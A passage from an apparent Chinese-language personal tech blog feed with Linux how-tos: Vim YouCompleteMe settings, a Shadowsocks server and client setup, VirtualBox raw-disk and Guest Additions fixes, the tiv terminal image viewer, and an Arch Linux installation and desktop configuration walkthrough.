&lt;Down&gt;     pumvisible() ? <span class="string">"\&lt;C-n&gt;"</span> : <span class="string">"\&lt;Down&gt;"</span></span><br><span class="line">inoremap &lt;expr&gt; &lt;Up&gt;       pumvisible() ? <span class="string">"\&lt;C-p&gt;"</span> : <span class="string">"\&lt;Up&gt;"</span></span><br><span class="line">inoremap &lt;expr&gt; &lt;PageDown&gt; pumvisible() ? <span class="string">"\&lt;PageDown&gt;\&lt;C-p&gt;\&lt;C-n&gt;"</span> : <span class="string">"\&lt;PageDown&gt;"</span></span><br><span class="line">inoremap &lt;expr&gt; &lt;PageUp&gt;   pumvisible() ? <span class="string">"\&lt;PageUp&gt;\&lt;C-p&gt;\&lt;C-n&gt;"</span> : <span class="string">"\&lt;PageUp&gt;"</span></span><br><span class="line">inoremap &lt;expr&gt; &lt;CR&gt;       pumvisible() ? <span class="string">"\&lt;C-y&gt;"</span> : <span class="string">"\&lt;CR&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> g:ycm_key_list_select_completion = [<span class="string">'&lt;Down&gt;'</span>]</span><br><span class="line"><span class="built_in">let</span> g:ycm_key_list_previous_completion = [<span class="string">'&lt;Up&gt;'</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> g:ycm_goto_buffer_command = <span class="string">'horizontal-split'</span></span><br><span class="line"><span class="built_in">let</span> g:ycm_server_python_interpreter=<span class="string">'/usr/bin/python2'</span></span><br><span class="line"><span class="built_in">let</span> g:ycm_global_ycm_extra_conf = <span class="string">'~/.vim/.ycm_extra_conf.py'</span></span><br><span class="line"><span class="built_in">let</span> g:airline<span class="comment">#extensions#tabline#enabled = 1</span></span><br><span class="line"><span class="built_in">let</span> g:ycm_seed_identifiers_with_syntax = 1</span><br><span class="line"><span class="built_in">let</span> g:ycm_complete_in_strings = 1</span><br><span class="line"><span class="built_in">let</span> g:ycm_collect_identifiers_from_tags_files = 1</span><br><span class="line"><span class="built_in">let</span> g:ycm_complete_in_comments = 1</span><br><span class="line"><span class="built_in">let</span> g:ycm_min_num_of_chars_for_completion = 2</span><br><span class="line"><span class="built_in">let</span> g:ycm_cache_omnifunc=0</span><br><span class="line"><span class="built_in">let</span> g:ycm_confirm_extra_conf=0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">syntax <span class="built_in">enable</span></span><br><span class="line"><span class="string">"colorscheme solarized</span></span><br><span class="line"><span class="string">"</span>colorscheme gotham</span><br><span class="line">colorscheme jellybeans</span><br><span class="line"><span class="built_in">let</span> g:solarized_termcolors=256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> g:NERDTreeDirArrowExpandable = <span class="string">'▸'</span></span><br><span class="line"><span class="built_in">let</span> g:NERDTreeDirArrowCollapsible = <span class="string">'▾'</span></span><br><span class="line">map &lt;C-b&gt; :NERDTreeToggle&lt;CR&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">map &lt;C-m&gt; :Tagbar&lt;CR&gt;</span><br><span class="line"><span class="built_in">let</span> g:tagbar_ctags_bin=<span class="string">'ctags'</span></span><br><span class="line"><span class="built_in">let</span> g:tagbar_width=30</span><br></pre></td></tr></table></figure>

<p>之后只需在 vim 中  <strong>:PluginInstall</strong> 安装插件，可能需要点时间…</p>
<p>taglist是一个用于显示定位程序中各种符号的插件。这里我使用的是tagbar，它是一个taglist的替代品，要是有tagbar还需要生成 tags 文件，生成方法可以参考 <a href="https://www.vim.org/scripts/script.php?script_id=2358" target="_blank" rel="noopener">https://www.vim.org/scripts/script.php?script_id=2358</a> 。</p>
<p>首先要从该网站下载  <code>cpp_src.tar.bz2</code> ，解压后是一个 cpp_src目录，然后执行一下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctags -R --c++-kinds=+p --fields=+iaS --extra=+q --language-force=C++ cpp_src</span><br><span class="line">mv tags ~/.vim</span><br></pre></td></tr></table></figure>

<p>而对于Vim颜色配置，比如本例中 jellybeans，则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/.vim/colors</span><br><span class="line"><span class="built_in">cd</span> ~/.vim/colors</span><br><span class="line">curl -O https://raw.githubusercontent.com/nanotech/jellybeans.vim/master/colors/jellybeans.vim</span><br><span class="line">然后在 .vimrc 中设置 colorscheme jellybeans</span><br></pre></td></tr></table></figure>

<p>注意，如果 <code>let g:ycm_global_ycm_extra_conf = &#39;~/.vim/.ycm_extra_conf.py&#39;</code> 中 默认的 .ycm_extra_conf.py ，可能会出现一些莫名其妙的错误，那么可以下载该文件替换原有的 *<em>.ycm_extra_conf.py *</em><br><a href="https://raw.githubusercontent.com/theodelrieu/dotfiles/master/.ycm_extra_conf.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/theodelrieu/dotfiles/master/.ycm_extra_conf.py</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.vim/</span><br><span class="line">curl -O  https://raw.githubusercontent.com/theodelrieu/dotfiles/master/.ycm_extra_conf.py</span><br></pre></td></tr></table></figure>

<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>基本上YCM配置到此结束了，也没有想象中的那么难啦～<br>现在vim支持Python和C/C++代码补全了<br>最后贴一张测试图：</p>
<p><img src="/uploads/images/ycm_vim/ycm_vim.png" alt="YCM VIM"></p>
<p>有啥问题可联系我哈~</p>
<p>bye</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Vim</tag>
        <tag>YCM</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS服务器Shadowsocks</title>
    <url>/centos-shadowsocks/</url>
    <content><![CDATA[<p>在很久之前我用Windows时一直使用 <strong>SoftEther VPN</strong> 来访问外网，但现在已经转向了SS，而且仅是通过转发流量来科学上网的话，无疑SS是最合适的，因此在 hostwinds 上也买了一台centos7服务器准备搭建shadowsocks。</p>
<a id="more"></a>

<p>Shadowsocks官网： <a href="https://shadowsocks.org/en/index.html" target="_blank" rel="noopener">https://shadowsocks.org/en/index.html</a><br>Shadowsocks配置介绍： <a href="https://shadowsocks.org/en/config/quick-guide.html" target="_blank" rel="noopener">https://shadowsocks.org/en/config/quick-guide.html</a><br>Github：<a href="https://github.com/shadowsocks/" target="_blank" rel="noopener">https://github.com/shadowsocks/</a></p>
<h2 id="SS配置服务器"><a href="#SS配置服务器" class="headerlink" title="SS配置服务器"></a>SS配置服务器</h2><p>查看python版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hwsrv-548851 ~]# python --version</span><br><span class="line">Python 2.7.5</span><br></pre></td></tr></table></figure>

<p>我的centos服务器默认没有安装Python Pip，同时可能还需要更新pip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hwsrv-548851 ~]# yum install python-pip</span><br><span class="line">[root@hwsrv-548851 ~]# pip install --upgrade pip</span><br></pre></td></tr></table></figure>

<p>之后就可以通过pip安装shadowsocks</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hwsrv-548851 ~]# pip install shadowsocks</span><br></pre></td></tr></table></figure>

<p>到此SS服务端安装完成，接下来还需要json格式的配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;:&quot;my_server_ip&quot;,</span><br><span class="line">    &quot;server_port&quot;:8388,</span><br><span class="line">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;local_port&quot;:1080,</span><br><span class="line">    &quot;password&quot;:&quot;barfoo!&quot;,</span><br><span class="line">    &quot;timeout&quot;:600,</span><br><span class="line">    &quot;method&quot;:&quot;chacha20-ietf-poly1305&quot;</span><br><span class="line">&#125;</span><br><span class="line">server: 服务器主机IP，默认 0.0.0.0</span><br><span class="line">server_port: 服务器端口 ，默认 8388</span><br><span class="line">local_address: 一般为 127.0.0.1</span><br><span class="line">local_port: 本地端口，一般 1080</span><br><span class="line">password: 连接SS服务器的密码</span><br><span class="line">timeout: 连接超时时间/s ，默认 300</span><br><span class="line">method: 加密方式，默认 aes-256-cfb</span><br></pre></td></tr></table></figure>

<p>如果要从命令行来启动服务端，则可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hwsrv-548851 ~]# ssserver -p 8998 -k mypassword</span><br></pre></td></tr></table></figure>

<p>一般都是从配置文件来启动ss服务端<br>类似如下 config.json </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;: &quot;104.168.xxx,xxx&quot;,</span><br><span class="line">    &quot;server_port&quot;: 8998,</span><br><span class="line">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;local_port&quot;: &quot;1080&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;mypassword&quot;,</span><br><span class="line">    &quot;timeout&quot;: 60,</span><br><span class="line">    &quot;method&quot;: &quot;aes-256-cfb&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用配置文件启动服务端并在后台运行： <code>ssserver -c config.json -d start</code> ，检测是否成功启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hwsrv-548851 ~]# netstat -anp|grep -i 8998</span><br><span class="line">tcp        0      0 104.168.xxx,xxx:8998    0.0.0.0:*               LISTEN      27701/python2       </span><br><span class="line">udp        0      0 104.168.xxx,xxx:8998    0.0.0.0:*                           27701/python2</span><br></pre></td></tr></table></figure>

<h2 id="SS配置客户端"><a href="#SS配置客户端" class="headerlink" title="SS配置客户端"></a>SS配置客户端</h2><p>SS的客户端分为Windows，MacOS，Linux，Android，iOS和OpenWRT<br>这里介绍Windows，Linux</p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>对于archlinux最直接的方法： <code>sudo pacman -S shadowsocks-qt5</code> 从GUI连接ss服务器<br>也可以从pip下载shadowsocks： <code>pip install shadowsocks</code>，然后再创建一个同服务端的config.json配置文件如 <code>sslocal -c config.json -d start</code> </p>
<h3 id="WIndows"><a href="#WIndows" class="headerlink" title="WIndows"></a>WIndows</h3><p>Windows下的 ss客户端 也可以从Python pip安装 <code>shadowsocks</code> 。也可以从 <a href="https://github.com/shadowsocks/shadowsocks-windows/releases" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks-windows/releases</a> 下载</p>
<p>不过如果从pip下载 shadowsocks，那么是无法直接启动的，解决方法如下：<br>到 <a href="https://slproweb.com/products/Win32OpenSSL.html" target="_blank" rel="noopener">https://slproweb.com/products/Win32OpenSSL.html</a> 下载最新版Windows openssl安装，然后去openssl安装目录 C:\Program Files\OpenSSL-Win64 找到 <code>libcrypto-1_1-x64.dll</code> 复制到 Python <code>Scripts</code>目录并重命名为<code>libcrypto.dll</code> 。否则提示 <code>libcrypto(OpenSSL) not found</code> 错误。</p>
<p>完成以上时运行 <code>sslocal -c config.json</code> 会提示错误 <code>AttributeError: function &#39;EVP_CIPHER_CTX_cleanup&#39; not found</code></p>
<p>原因是 openssl1.1.0版本中，废弃了<code>EVP_CIPHER_CTX_cleanup</code> 函数，可以用 <code>EVP_CIPHER_CTX_reset</code> 函数替代<code>EVP_CIPHER_CTX_cleanup</code> 函数。</p>
<p>那么我们只需打开 C:\Users\Administrator\AppData\Local\Programs\Python\Python37\Lib\site-packages\shadowsocks\crypto\openssl.py 文件(路径可能不同)，将 <code>EVP_CIPHER_CTX_cleanup</code> 全部替换为 <code>EVP_CIPHER_CTX_reset</code>，总共两处需要修改，之后保存即可。</p>
<p>执行 <code>sslocal -c config.json</code> 成功！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://shadowsocks.org/en/download/servers.html" target="_blank" rel="noopener">Shadowsocks Server</a></li>
<li><a href="https://shadowsocks.org/en/download/clients.html" target="_blank" rel="noopener">Shadowsocks Client</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>Shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox添加raw disk时出现VERR_ACCESS_DENIED</title>
    <url>/virtualbox-addrawdisk-err/</url>
    <content><![CDATA[<p>本来想在virtualbox里U盘启动，用 vboxmanage 创建就可以完成的然而却在启动时发生了错误，这里把错误过程记录下来</p>
<a id="more"></a>

<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>插上U盘后 lsblk 后即可找到U盘的设备名称如 /dev/sda，如果直接 <code>vboxmanage internalcommands createrawvmdk  -filename usb.vmdk -rawdisk /dev/sda</code> 提示没有权限只需，那么可以root权限执行该命令，的确成功了，OK。</p>
<p>但是当我尝试在virtualbox存储介质中载入虚拟盘时，却发生了一个奇怪的错误：<strong>virtualbox没有权限访问usb.vmdk</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Permission problem accessing the file for the medium &apos;/home/joxrays/usb.vmdk&apos; (VERR_ACCESS_DENIED).</span><br><span class="line"></span><br><span class="line">返回 代码: </span><br><span class="line">VBOX_E_FILE_ERROR (0x80BB0004)</span><br><span class="line">组件: </span><br><span class="line">MediumWrap</span><br><span class="line">界面: </span><br><span class="line">IMedium &#123;ad47ad09-787b-44ab-b343-a082a3f2dfb1&#125;</span><br><span class="line">被召者: </span><br><span class="line">IVirtualBox &#123;d0a0163f-e254-4e5b-a1f2-011cf991c38d&#125;</span><br><span class="line">被召者 RC: </span><br><span class="line">VBOX_E_OBJECT_NOT_FOUND (0x80BB0001)</span><br></pre></td></tr></table></figure>

<p>无论我chown还是chmod并没有解决该问题。经过Google后在 stackexchange 找到了问题的解决方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo usermod -aG disk <span class="variable">$USER</span></span><br><span class="line">或者 sudo gpasswd -a <span class="variable">$USER</span> disk</span><br></pre></td></tr></table></figure>

<p>很简单，仅是讲当前用户添加到 <strong>disk组</strong>，之后注销重新登录就好了。</p>
<p>之后在执行如下命令就看创建一个<strong>.vmdk</strong>虚拟盘文件了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vboxmanage internalcommands createrawvmdk  -filename usb.vmdk -rawdisk /dev/sda</span><br></pre></td></tr></table></figure>

<p>关于disk组，在archlinux wiki上是这样解释： Access to block devices not affected by other groups such as <code>optical</code>, <code>floppy</code>, and <code>storage</code> 。也就是说加入了disk组的用户能够访问那些不受 optical ，floppy 和 storage组控制的块设备。</p>
<p>如果想要把用户从disk组中删除，则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo gpasswd -d <span class="variable">$USER</span> disk</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://unix.stackexchange.com/questions/284704/verr-access-denied-when-trying-to-add-a-raw-disk-to-virtual-box" target="_blank" rel="noopener">VERR_ACCESS_DENIED when trying to add a raw disk to virtual box</a></li>
<li><a href="https://wiki.archlinux.org/index.php/Users_and_groups_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#systemd_%E4%B9%8B%E5%89%8D%E7%9A%84%E7%BE%A4%E7%BB%84" target="_blank" rel="noopener">Users_and_groups</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>VirtualBox</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Terminal 显示图像</title>
    <url>/linux-tiv/</url>
    <content><![CDATA[<p>其实很久之前我就在想linux终端里能否显示图像呢？然而这个问题一直拖延至今，直到google过程中发现了Tiv(<strong>TerminalImageViewer</strong>)</p>
<a id="more"></a>

<h2 id="Tiv"><a href="#Tiv" class="headerlink" title="Tiv"></a>Tiv</h2><p>本文我要介绍的是tiv这个小巧的工具，它是由C++写成的<br>Github: <a href="https://github.com/stefanhaustein/TerminalImageViewer" target="_blank" rel="noopener">https://github.com/stefanhaustein/TerminalImageViewer</a></p>
<p><strong>tiv</strong>使用<strong>RGB ANSI代码</strong>和<strong>unicode块图形字符</strong>在（现代）终端中显示图像，这也就是说tiv只能 <strong>像素化</strong> 的显示图像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/stefanhaustein/TerminalImageViewer.git</span><br><span class="line"><span class="built_in">cd</span> TerminalImageViewer/src/main/cpp</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>之后即可运行tiv</p>
<p><code>./tiv -help</code> 查看帮助</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Terminal Image Viewer</span><br><span class="line"></span><br><span class="line">usage: tiv [options] &lt;image&gt; [&lt;image&gt;...]</span><br><span class="line"></span><br><span class="line">  -0        : No block character adjustment, always use top half block char.</span><br><span class="line">  -256      : Use 256 color mode.</span><br><span class="line">  -c &lt;num&gt;  : Number of thumbnail columns in &apos;dir&apos; mode (3).</span><br><span class="line">  -d        : Force &apos;dir&apos; mode. Automatially selected for more than one input.</span><br><span class="line">  -f        : Force &apos;full&apos; mode. Automatically selected for one input.</span><br><span class="line">  -help     : Display this help text.</span><br><span class="line">  -h &lt;num&gt;  : Set the maximum height to &lt;num&gt; lines.</span><br><span class="line">  -w &lt;num&gt;  : Set the maximum width to &lt;num&gt; characters.</span><br></pre></td></tr></table></figure>

<p><code>./tiv ~/1.png</code><br><img src="/uploads/images/terminal_image/tiv_1.png" alt="img"></p>
<p>当然还可以 <code>./tiv ~/1.png -0</code><br><img src="/uploads/images/terminal_image/tiv_2.png" alt="img"></p>
<p>当然我也试过 <a href="http://www.namesdir.com/mirrors/nongnu/fbi-improved/" target="_blank" rel="noopener">fim</a> 但觉得总有点差强人意，最后还是选择tiv，尽管它只能像素化的显示图像。。。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox安装manjaro后安装增强功能</title>
    <url>/virtual-manjaro-guest-iso/</url>
    <content><![CDATA[<p>一般来说，VirtualBox成功安装manjaro后可以在 [设备] -&gt; [安装增强功能]。然而有时却事与愿违的怎么也无法安装，那么这时我们就可以在manjaro里自行安装 VBoxGuestAdditions，let’s go! </p>
<a id="more"></a>

<h2 id="virtualbox-guest-iso"><a href="#virtualbox-guest-iso" class="headerlink" title="virtualbox-guest-iso"></a>virtualbox-guest-iso</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S virtualbox-guest-iso</span><br></pre></td></tr></table></figure>

<p>这是必须的，如此之外还可以访问官网 <a href="https://download.virtualbox.org/virtualbox/6.0.10/" target="_blank" rel="noopener">https://download.virtualbox.org/virtualbox/6.0.10/</a> 下载。<br>目前我的版本是6.0.10。下载后的iso文件存放路径为 <strong>/usr/lib/virtualbox/additions/VBoxGuestAdditions.iso</strong></p>
<h2 id="linux-header"><a href="#linux-header" class="headerlink" title="linux header"></a>linux header</h2><p>这时就能够挂载iso镜像文件(root权限)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount /usr/lib/virtualbox/additions/VBoxGuestAdditions.iso /mnt</span><br><span class="line"><span class="built_in">cd</span> /mnt</span><br></pre></td></tr></table></figure>

<p>我们只需关心 <strong>VBoxLinuxAdditions.run</strong> ，若直接 <code>sudo sh VBoxLinuxAdditions.run</code> ，可能会导致安装不成功，如下消息</p>
<blockquote>
<p>ifying archive integrity… All good.<br>Uncompressing VirtualBox 6.0.10 Guest Additions for Linux……..<br>VirtualBox Guest Additions installer<br>Removing installed version 6.0.10 of VirtualBox Guest Additions…<br>Copying additional installer modules …<br>Installing additional modules …<br>VirtualBox Guest Additions: Starting.<br>VirtualBox Guest Additions: Building the VirtualBox Guest Additions kernel<br>modules.  This may take a while.<br>VirtualBox Guest Additions: To build modules for other installed kernels, run<br>VirtualBox Guest Additions:   /sbin/rcvboxadd quicksetup <version><br>VirtualBox Guest Additions: or<br>VirtualBox Guest Additions:   /sbin/rcvboxadd quicksetup all<br>VirtualBox Guest Additions: Building the modules for kernel 4.19.62-1-MANJARO.</version></p>
<p><font color="red">This system is currently not set up to build kernel modules.<br>Please install the Linux kernel “header” files matching the current kernel<br>for adding new hardware support to the system.</font><br>VirtualBox Guest Additions: Running kernel modules will not be replaced until<br>the system is restarted</p>
</blockquote>
<p>这表明目前系统没有安装 linux header 文件，解决方法如下(<strong>注意内核版本</strong>)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uname -r</span><br><span class="line">4.19.62-1-MANJARO</span><br><span class="line">sudo pacman -S linux419-headers</span><br><span class="line">sudo pacman -S linux419-virtualbox-guest-modules</span><br></pre></td></tr></table></figure>

<p>PS： 若 <code>sudo pacman -S linux-headers</code> ，我这manjaro默认安装为 <code>linux316-headers-3.16.71-1</code>。相反 archlinux安装的是最新版本……</p>
<p>接着就可以执行 <code>sudo sh VBoxLinuxAdditions.run</code> 来安装 VirtualBox Guest Additions，该过程可能需要一些时间来构建内核模块。若没有出现<font color="red">红字</font>部分，则表明安装成功，重启即可使用该功能</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Archlinux</tag>
      </tags>
  </entry>
  <entry>
    <title>Archlinux从安装到基本配置</title>
    <url>/archlinux-configure/</url>
    <content><![CDATA[<p>这里介绍从安装archlinux系统到基本配置过程，基本搜集了网上和官方wiki整理而来的，把错误最低化。当然，本文也是作为我的一份手册吧…</p>
<a id="more"></a>

<h2 id="安装Archlinux"><a href="#安装Archlinux" class="headerlink" title="安装Archlinux"></a>安装Archlinux</h2><h3 id="下载Archlinux-ISO"><a href="#下载Archlinux-ISO" class="headerlink" title="下载Archlinux ISO"></a>下载Archlinux ISO</h3><p>到官网下载 <a href="https://www.archlinux.org/download/" target="_blank" rel="noopener">https://www.archlinux.org/download/</a> 并做成U盘启动盘</p>
<h3 id="一系列的命令…-BIOS"><a href="#一系列的命令…-BIOS" class="headerlink" title="一系列的命令…(BIOS)"></a>一系列的命令…(BIOS)</h3><p>由于我是有线连接网络的，所以… 反正也可以在虚拟机里试下呗</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dhcpcd(可选)</span><br><span class="line">ping www.baidu.com</span><br><span class="line">timedatectl <span class="built_in">set</span>-ntp <span class="literal">true</span></span><br><span class="line">fdisk /dev/sda		<span class="comment"># 分区这里应人而异。我就不多说了</span></span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">mkfs.ext4 /dev/sdaX</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">mkswap /dev/sdaY     <span class="comment"># 交换分区</span></span><br><span class="line">swapon /dev/sdaY</span><br><span class="line">mount /dev/sda1 /mnt</span><br><span class="line">nano /etc/pacman.d/mirrorlist  </span><br><span class="line"> <span class="comment"># 添加 	Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch</span></span><br><span class="line">pacstrap /mnt base base-devel</span><br><span class="line">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br><span class="line">arch-chroot /mnt</span><br><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">hwclock --systohc --localtime</span><br><span class="line">nano /etc/locale.gen</span><br><span class="line">    en_US.UTF-8 UTF-8</span><br><span class="line">    zh_CN.UTF-8 UTF-8</span><br><span class="line">    	...</span><br><span class="line">locale-gen</span><br><span class="line"><span class="built_in">echo</span> LANG=en_US.UTF-8 &gt; /etc/locale.conf</span><br><span class="line"><span class="built_in">echo</span> myhostname &gt; /etc/hostname</span><br><span class="line">nano  /etc/hosts</span><br><span class="line">	127.0.0.1	localhost</span><br><span class="line">    ::1		localhost</span><br><span class="line">    127.0.1.1	myhostname	myhostname</span><br><span class="line">passwd</span><br><span class="line">pacman -S grub</span><br><span class="line">grub-install --target=i386-pc /dev/sda	<span class="comment">#BIOS系统 ，默认 i386-pc</span></span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">umount -R /mnt</span><br><span class="line">reboot</span><br><span class="line">pacman -S sudo net-tools wireless_tools</span><br><span class="line">useradd -m -G wheel  whoami</span><br><span class="line">passwd whoami</span><br><span class="line">nano /etc/sudoers</span><br><span class="line">	<span class="comment"># %wheel ALL=(ALL)ALL 取消注释</span></span><br><span class="line">reboot</span><br><span class="line">sudo dhcpcd</span><br><span class="line">ifconfig </span><br><span class="line"><span class="comment"># 安装显卡驱动</span></span><br><span class="line">sudo pacman -S xf86-video-intel </span><br><span class="line"><span class="comment"># 安装Xorg开源图形服务</span></span><br><span class="line">sudo pacman -S xorg</span><br></pre></td></tr></table></figure>

<h3 id="UEFI"><a href="#UEFI" class="headerlink" title="UEFI"></a>UEFI</h3><p>如果是UEFI，那么可以用 <code>fdisk</code> 或 <code>parted</code> 分区，grub引导</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">parted /dev/sda mklabel gpt</span><br><span class="line">parted /dev/sda mkpart  ESP fat32 1M 513M</span><br><span class="line">parted /dev/sda <span class="built_in">set</span> 1 boot on</span><br><span class="line">parted /dev/sda mkpart primary ext4 513M 20.5G  <span class="comment"># 20.5G 为绝对大小</span></span><br><span class="line">parted /dev/sda mkpart primary ext4 20.5G 100%</span><br><span class="line"></span><br><span class="line">mkdir /mnt/boot</span><br><span class="line">mkfs.fat -F32 /dev/sda1</span><br><span class="line">mkfs.ext4 /dev/sda2</span><br><span class="line">mount /dev/sda1 /mnt/boot</span><br><span class="line">mount /dev/sda2 /mnt</span><br><span class="line"></span><br><span class="line">pacstrap /mnt base base-devel</span><br><span class="line">genfstab -L /mnt &gt;&gt; /mnt/etc/fstab</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">pacman -S grub efibootmgr</span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=esp --bootloader-id=GRUB </span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>

<h2 id="可选桌面环境安装"><a href="#可选桌面环境安装" class="headerlink" title="可选桌面环境安装"></a>可选桌面环境安装</h2><p>接着还需要按照桌面环境</p>
<h3 id="GNOME"><a href="#GNOME" class="headerlink" title="GNOME"></a>GNOME</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S gnome gnome-extra</span><br><span class="line">gnome-session</span><br></pre></td></tr></table></figure>

<h3 id="KDE"><a href="#KDE" class="headerlink" title="KDE"></a>KDE</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S plasma   kde-applications</span><br><span class="line">startkde</span><br></pre></td></tr></table></figure>

<h3 id="Deepin"><a href="#Deepin" class="headerlink" title="Deepin"></a>Deepin</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S deepin deepin-extra</span><br><span class="line">1. lightdm</span><br><span class="line">nano /etc/lightdm/lightdm.conf</span><br><span class="line">	[Seat:*]</span><br><span class="line">    ...</span><br><span class="line">    greeter-session=lightdm-deepin-greeter</span><br><span class="line">   </span><br><span class="line">2. Xinit</span><br><span class="line">nano ~/.xinitrc</span><br><span class="line">	exec startdde</span><br><span class="line">startx</span><br></pre></td></tr></table></figure>

<h3 id="Xfce"><a href="#Xfce" class="headerlink" title="Xfce"></a>Xfce</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xfce4 xfce4-goodies</span><br><span class="line">startxfce4（手动进入桌面）</span><br></pre></td></tr></table></figure>

<h2 id="安装桌面登录管理器-自行选择"><a href="#安装桌面登录管理器-自行选择" class="headerlink" title="安装桌面登录管理器(自行选择)"></a>安装桌面登录管理器(自行选择)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S sddm</span><br><span class="line">sudo systemctl enable sddm</span><br><span class="line"></span><br><span class="line">sudo pacman -S gdm</span><br><span class="line">sudo systemctl enable gdm</span><br><span class="line"></span><br><span class="line">sudo pacman -S lightdm lightdm-gtk-greeter</span><br><span class="line">sudo systemctl enable lightdm</span><br></pre></td></tr></table></figure>

<h2 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S network-manager-applet</span><br><span class="line">sudo systemctl disable netctl</span><br><span class="line">sudo systemctl enable NetworkManager</span><br></pre></td></tr></table></figure>

<h2 id="启动蓝牙"><a href="#启动蓝牙" class="headerlink" title="启动蓝牙"></a>启动蓝牙</h2><p>安装了KDE话，默认是未找到蓝牙适配器的。若要连接到蓝牙耳麦，那么可以这样做</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S bluez bluez-utils pulseaudio-bluetooth pavucontrol pulseaudio-alsa</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> bluetooth</span><br><span class="line">usermod -aG lp <span class="variable">$USER</span></span><br><span class="line"></span><br><span class="line">sudo systemctl start bluetooth</span><br><span class="line">pulseaudio -k</span><br><span class="line">pulseaudio --start</span><br></pre></td></tr></table></figure>

